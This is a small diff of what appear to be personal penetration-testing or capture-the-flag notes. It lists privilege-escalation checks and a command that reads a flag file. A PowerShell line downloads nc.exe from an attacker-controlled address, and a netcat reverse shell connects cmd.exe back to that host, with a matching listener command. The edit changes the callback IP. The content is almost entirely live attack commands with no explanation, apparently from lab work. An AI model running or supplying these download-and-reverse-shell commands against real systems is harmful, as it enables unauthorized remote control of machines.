@@ -31,8 +31,9 @@ Invoke-AllChecks
 indirect show content
 (get-content user.txt).substring(0,16)
 
+NC get session
 powershell wget "http://10.10.14.11/nc.exe" -outfile "nc.exe"
-nc.exe -e cmd.exe 10.10.14.15 1234
+nc.exe -e cmd.exe 10.10.14.11 1234
 
 nc -nvlp 1234
 
